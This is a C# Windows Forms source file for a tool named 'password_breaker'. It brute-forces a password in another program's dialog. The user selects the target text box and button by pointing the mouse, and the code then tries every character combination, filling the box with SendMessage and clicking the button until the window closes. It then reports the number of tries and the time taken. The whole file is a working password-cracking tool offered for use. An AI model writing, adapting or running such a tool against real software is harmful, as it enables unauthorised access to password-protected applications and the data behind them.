using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace password_breaker
{
    public partial class Form1 : Form
    {
        int WindowHandle = 0;
        int ButtonHandle = 0;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int SendMessage(int hWnd, uint Msg, int wParam, string lParam);
        [DllImport("User32.dll")]
        private static extern int WindowFromPoint(Point p);

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            char[] character = new char[100];
            char from = (char)0;
            char to = (char)128;
            uint length = 0;
            double try_no = 0;
            DateTime begin_time = DateTime.Now;
            TimeSpan time_took;

            while (length < 100)
            {
                character[0]++;
                for (int i = 0; i <= length; i++)
                {
                    if (character[i] == to)
                    {
                        character[i] = from;
                        character[i + 1]++;

                        if (i == length)
                        {
                            length++;
                            break;
                        }
                    }
                    else break;
                }

                SendMessage(WindowHandle, 12, 0, new String(character)); //12 = 0x000C
                SendMessage(ButtonHandle, 245, 0, null);      //245 = 0x00F5
                try_no++;
                
                if (Marshal.GetLastWin32Error() == 1400)
                {
                    time_took = DateTime.Now - begin_time;

                    textBox1.Text = "Password was found on: " + try_no.ToString() + " try. The search took: " + time_took.TotalSeconds.ToString() + " seconds, its length is: " + (length + 1).ToString();
                    return;
                }
            }

            MessageBox.Show("Password is too long!");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            WindowHandle = WindowFromPoint(MousePosition);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            ButtonHandle = WindowFromPoint(MousePosition);
        }
    }
}
